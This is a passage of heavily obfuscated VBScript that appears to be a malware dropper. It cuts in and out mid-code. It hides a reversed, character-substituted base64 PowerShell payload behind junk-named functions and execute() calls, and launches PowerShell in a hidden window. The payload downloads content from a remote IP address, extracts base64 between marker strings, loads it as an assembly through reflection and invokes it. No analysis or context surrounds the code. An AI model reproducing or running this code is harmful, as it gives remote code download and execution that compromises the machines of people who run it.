"poweMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSrshMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSell -comMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSmand " + cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc + """" ,"MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS","")
IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgro.run NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev, 0, true
end if

Function jdcQqKUckHpuaONUKUPxNkNnPrqSZAWNpHRpkWoqkKmxzKGLaqUaNDmNNnRDWaWMWLnWpdYGMx(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO,lPjTdtDRPUnuQSZBYuRLcAIPJNLIKDDDAcUnPGUdBqlJdqiJNqtQDHlJZJUHDAshtAPBAPNihJ)
dim SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = "jdcQqKUckHpuaONUKUPxNkNnPrqSZAWNpHRpkWoqkKmxzKGLaqUaNDmNNnRDWaWMWLnWpdYGMx = "
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw + "InStr(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO, lPjTdtDRPUnuQSZBYuRLcAIPJNLIKDDDAcUnPGUdBqlJdqiJNqtQDHlJZJUHDAshtAPBAPNihJ)"
execute(SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw)
End Function
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
Function GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO,lPjTdtDRPUnuQSZBYuRLcAIPJNLIKDDDAcUnPGUdBqlJdqiJNqtQDHlJZJUHDAshtAPBAPNihJ,dCZCsDNUbUDKbaqbjfOvOGUzfUcUuTSuDXOdbIUUUQUTUcSU)
dim SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = "GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW = "
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw + "Replace"
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw + "(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO ,lPjTdtDRPUnuQSZBYuRLcAIPJNLIKDDDAcUnPGUdBqlJdqiJNqtQDHlJZJUHDAshtAPBAPNihJ, dCZCsDNUbUDKbaqbjfOvOGUzfUcUuTSuDXOdbIUUUQUTUcSU)"
execute(SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw)
End Function
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
Function JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO)
dim SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = "JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC = "
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw + "StrReverse"
SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw = SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw + "(PAxPeOUccgMyGqMxNcCkaeNcstKxouLPKlKMccuecvuObvrtWlLGBjuRMKKjLeZOAbcKKQjrOO)"
execute(SIGUAqiUWYfaDZhUOWkhPLeaOhjLePLJJZefWKcAIURwOUIMlBQDjOROhGeOLeDGLLaRJKWIGw)
End Function

Function cYDLCmuWcWmmIZPlKOLuLldJDyiQpXJmmbpfcopLWCLWNiuj(TWkQoQzbsbQKpDNnKtKcKelvoGyKwLgkQaQbsWUcbqcsYyNK,PeAkcYCKLKYWlTKApDbYbRWNSbDgOWSfYXQNLONNKUNLnDYL,KOtBZDTKtjDcnRjhsfUMUBhOyxLDRkvxDDTKtzmPjlPUDLJP)
    cYDLCmuWcWmmIZPlKOLuLldJDyiQpXJmmbpfcopLWCLWNiuj = Replace(TWkQoQzbsbQKpDNnKtKcKelvoGyKwLgkQaQbsWUcbqcsYyNK, PeAkcYCKLKYWlTKApDbYbRWNSbDgOWSfYXQNLONNKUNLnDYL, KOtBZDTKtjDcnRjhsfUMUBhOyxLDRkvxDDTKtzmPjlPUDLJP)
End Function

Function aMcoAlAnDnlBOoLpviSfSKllIfOpUtGdlDIXDYDNnyNcfObt(TWkQoQzbsbQKpDNnKtKcKelvoGyKwLgkQaQbsWUcbqcsYyNK)
    aMcoAlAnDnlBOoLpviSfSKllIfOpUtGdlDIXDYDNnyNcfObt = StrReverse(TWkQoQzbsbQKpDNnKtKcKelvoGyKwLgkQaQbsWUcbqcsYyNK)
End Function

dim CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP
CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP = "  "

dim nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK
nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK = "/ ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ /"
dim DAHkxTmnYnTcIKAuxDOCOmecrYKJUcPXAYwOYNSOnGOarKKO


DAHkxTmnYnTcIKAuxDOCOmecrYKJUcPXAYwOYNSOnGOarKKO = aMcoAlAnDnlBOoLpviSfSKllIfOpUtGdlDIXDYDNnyNcfObt("⁂kC⁂zB⁂d⁂4G⁂lBQb⁂UH⁂nBgc⁂EG⁂k⁂⁂I⁂wC⁂sB⁂b⁂UH⁂uB⁂J⁂gC⁂lBwa⁂8G⁂2Bgb⁂kE⁂u⁂⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂8G⁂oB⁂d⁂UG⁂tB⁂J⁂sD⁂p⁂wJ⁂gG⁂0B⁂d⁂⁂H⁂6⁂wL⁂8C⁂x⁂QO⁂UD⁂u⁂QM⁂cD⁂4⁂gL⁂ED⁂y⁂⁂M⁂4C⁂y⁂⁂N⁂8C⁂jBwb⁂UH⁂zBQa⁂4G⁂fBwR⁂UE⁂GBwX⁂IE⁂BBwU⁂YD⁂0⁂⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂cG⁂mB⁂a⁂oG⁂nBg" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂gH⁂6Bga⁂cG⁂mBge⁂cG⁂mBga⁂oH⁂6BgL⁂QH⁂4B⁂d⁂cC⁂o⁂⁂L⁂⁂C⁂9⁂⁂I⁂MH⁂0Bgb⁂UG⁂tBQd⁂cG⁂yBQY⁂QC⁂7⁂QK⁂cC⁂JBQQ⁂YF⁂n⁂⁂K⁂QG⁂vB⁂a⁂QH⁂lBQT⁂QH⁂lBwR⁂4C⁂lB⁂c⁂kH⁂0B⁂J⁂⁂C⁂9⁂⁂I⁂QG⁂vB⁂a⁂QH⁂lBQb⁂QC⁂7⁂QK⁂cC⁂lBQb⁂8G⁂IBgL⁂IH⁂lBgY⁂kG⁂GBwJ⁂gC⁂lB⁂c⁂kH⁂UB⁂d⁂UG⁂HBgL⁂kH⁂sBgY⁂0G⁂lBwc⁂MH⁂BB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂UG⁂kBQY⁂8G⁂sB⁂J⁂⁂C⁂9⁂⁂I⁂UG⁂wBQe⁂QH⁂k⁂wO⁂kC⁂zBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QH⁂5BgQ⁂QG⁂uBQY⁂0G⁂tBwb⁂MG⁂k⁂⁂K⁂QG⁂hBwb⁂wE⁂6⁂gO⁂0F⁂5B⁂b⁂IG⁂tBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂MH⁂zBQQ⁂4C⁂uBwb⁂kG⁂0BwY⁂UG⁂sBg" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂UG⁂SBgL⁂0G⁂lB⁂d⁂MH⁂5BwU⁂sF⁂g⁂QP⁂⁂C⁂5B⁂b⁂IG⁂tBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂MH⁂zBQQ⁂QG⁂lB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂vB⁂b⁂QC⁂7⁂QK⁂QG⁂uBQY⁂0G⁂tBwb⁂ME⁂0⁂gN⁂UG⁂zBQY⁂IG⁂k⁂⁂K⁂cG⁂uBQa⁂IH⁂0BwU⁂QD⁂2⁂Q" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂MH⁂hBgQ⁂0G⁂vBgc⁂YE⁂6⁂gO⁂0F⁂0Bgc⁂UG⁂2Bgb⁂8G⁂DBgL⁂0G⁂lB⁂d⁂MH⁂5BwU⁂sF⁂g⁂QP⁂⁂C⁂zBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QH⁂5BgQ⁂QG⁂uBQY⁂0G⁂tBwb⁂MG⁂k⁂wO⁂kC⁂oB⁂d⁂cG⁂uBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂wE⁂0⁂gN⁂UG⁂zBQY⁂IG⁂k⁂⁂I⁂wC⁂4BQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QG⁂uBQS⁂QH⁂yBQY⁂QH⁂zB⁂J⁂gC⁂nBgb⁂kG⁂yB⁂d⁂MH⁂iBQd⁂MF⁂u⁂⁂d⁂gH⁂lB⁂V⁂UG⁂nBQY⁂0G⁂pB⁂J⁂⁂C⁂9⁂⁂I⁂QG⁂uBQY⁂0G⁂tBwb⁂ME⁂0⁂gN⁂UG⁂zBQY⁂IG⁂k⁂wO⁂gH⁂lB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂4G⁂JB⁂d⁂IH⁂hB⁂d⁂MH⁂k⁂⁂I⁂0C⁂g⁂⁂e⁂UG⁂kBgb⁂kE⁂kBgb⁂UG⁂k⁂⁂I⁂0D⁂g⁂⁂a⁂QH⁂nBgb⁂UG⁂MB⁂N⁂YD⁂lBwc⁂EG⁂iB⁂J⁂sD⁂oB⁂d⁂cG⁂uBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂wE⁂u⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂sBgR⁂QH⁂yBQY⁂QH⁂zB⁂J⁂⁂C⁂9⁂wK⁂⁂C⁂4BQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QG⁂uBQS⁂QH⁂yBQY⁂QH⁂zB⁂J⁂sD⁂4BQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QG⁂uBQS⁂QH⁂yBQY⁂QH⁂zB⁂J⁂⁂C⁂0Bw" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂0C⁂g⁂⁂e⁂UG⁂kBgb⁂kE⁂kBgb⁂UG⁂k⁂⁂I⁂QG⁂uBQY⁂0C⁂g⁂⁂M⁂⁂C⁂lBw" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂0C⁂g⁂⁂e⁂UG⁂kBgb⁂kE⁂0Bgc⁂EG⁂0Bwc⁂QC⁂7⁂QK⁂cG⁂hB⁂b⁂YE⁂kBgb⁂UG⁂k⁂⁂K⁂YG⁂PB⁂e⁂UG⁂kBgb⁂kE⁂u⁂⁂d⁂gH⁂lB⁂V⁂UG⁂nBQY⁂0G⁂pB⁂J⁂⁂C⁂9⁂⁂I⁂gH⁂lB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂4G⁂JB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂4G⁂lB⁂J⁂sD⁂p⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂sBgR⁂QH⁂yBQY⁂QH⁂zB⁂J⁂gC⁂mBwT⁂gH⁂lB⁂" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂4G⁂JBgL⁂QH⁂4BQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QF⁂lBw" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂tBQa⁂QC⁂g⁂QP⁂⁂C⁂4BQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QG⁂uBQS⁂QH⁂yBQY⁂QH⁂zB⁂J⁂sD⁂n⁂gP⁂4D⁂EBgT⁂UE⁂fB⁂N⁂YD⁂FBwU⁂EE⁂CB⁂P⁂wD⁂n⁂⁂I⁂0D⁂g⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂sBgR⁂QG⁂uBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QC⁂7⁂wJ⁂4D⁂+⁂⁂V⁂IF⁂BB⁂V⁂MF⁂fB⁂N⁂YD⁂FBwU⁂EE⁂CB⁂P⁂wD⁂n⁂⁂I⁂0D⁂g⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂sBgR⁂QH⁂yBQY⁂QH⁂zB⁂J⁂sD⁂p⁂wc⁂UG⁂0BQe⁂IE⁂lBw" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂tBQa⁂QC⁂o⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & 